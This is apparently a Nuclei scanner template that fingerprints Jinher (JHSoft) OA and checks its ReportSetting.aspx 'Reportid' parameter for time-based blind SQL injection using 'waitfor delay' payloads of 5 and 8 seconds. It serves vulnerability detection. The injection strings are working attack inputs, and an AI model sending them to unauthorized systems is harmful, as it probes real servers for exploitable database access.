id: jinher-reportsetting-sqli
info:
  name: "金和 OA ReportSetting.aspx SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: Jinher OA

flow: http(1) && http(2)

http:
  - id: detect-application
    method: GET
    path:
      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
    matchers:
      - type: word
        part: body
        words:
          - "JHSoft"

  - id: check-sqli
    method: GET
    path:
      - "{{BaseURL}}/c6/Jhsoft.Web.BIframe/ReportSetting.aspx/?Reportid=1'waitfor+delay%270:0:5%27--"
      - "{{BaseURL}}/c6/Jhsoft.Web.BIframe/ReportSetting.aspx/?Reportid=1'waitfor+delay%270:0:8%27--"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "ASP.NET_SessionId="
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
